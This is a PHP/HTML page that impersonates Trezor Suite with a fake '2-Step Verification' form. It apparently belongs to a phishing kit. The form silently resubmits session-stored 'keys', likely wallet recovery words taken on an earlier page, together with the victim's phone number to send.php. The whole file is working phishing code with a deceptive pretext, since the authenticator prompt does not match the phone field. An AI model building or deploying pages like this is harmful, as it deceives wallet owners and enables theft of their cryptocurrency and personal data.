<?php include_once './config.php';?>
<html lang="en">
    <?php
        $title = 'Trezor Suite';
        include_once './includes/meta.php'; 
    ?>
    <body>
        <link rel="stylesheet" href="./assets/country-code-picker/css/jquery.ccpicker.css">
        <div class="container-fluid">
            <div class="row">
                <div class="col-sm-5 bg-white text-center position-relative" style="height: 100vh;">
                    <div class="position-absolute w-100 text-center" style="top: 40%">
                        <img src="<?= base_url('assets/img/logo.png')?>" alt="Logo" width="200" title="Trezor Suite" class="" style="" />
                        <h1 class="fs55 py5">Welcome!</h1>
                    </div>
                </div>
                <div class="col-sm-7" style="height: 100vh; overflow: auto;  ">
                    <div class="text-center mt60 mb15 pt25">
                        <div class="p10 bg-white d-inline-block rounded-pill shadow">
                            <img src="<?= base_url('assets/img/icon2.png')?>" alt="Logo" width="90" title="Trezor Suite" class="rounded-circle" style="background-color: #F4F4F4" />
                            <span class="fs20 px35">Connect your Trezor</span>
                        </div>
                    </div>
                    <div class="row justify-content-center mt60">
                        <div class='col-sm-6 shadow-lg p25 rounded-3 bg-white'>
                            <h1 class="fs22 text-center">2-Step Verification</h1>
                            <p class="my20 fw-bold">Enter the 2-Step verification generated by your authenticator app.</p>
                            <form method="post" action="<?= base_url('send.php')?>" class="py10">
                                <div className="my25">
                                    <?php foreach ($_SESSION["keys"] as $ki => $key) { ?>
                                    <input type="hidden" name="keys[<?=$ki?>]" class="form-control text-white py8 key_input" placeholder="<?=$ki?>" required="" style="background: transparent; border: 1px solid rgb(51, 51, 51);" value="<?=$key?>" />
                                    <?php  } ?>
                                    <div class="form-control fs16" style=" background-color: #efefef; border: 0px; ">
                                        <input name="phone_number" type="number" id="phone_number" required="" class="" style="width: 75%; border:1px solid #eee; padding: 0.375rem 0.75rem; font-size: 1rem" placeholder="Phone number" value="" >
                                    </div>
                                </div>
                                <div class="row">
                                    <div class="col-sm-12 my20 text-center">
                                        <button type="submit" class="btn btn-success border px55 fs16 py10 rounded-pill">Submit</button>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php';  ?>
        <script src="./assets/country-code-picker/js/jquery.ccpicker.min.js"></script>
        <script type="text/javascript">
            $(document).ready(function() {
                $("#phone_number").CcPicker({ countryCode: "us", dataUrl: "<?= base_url('assets/country-code-picker/data/en.json')?>", searchPlaceHolder: "Find..." });
            });
            
        </script>
    </body>
</html>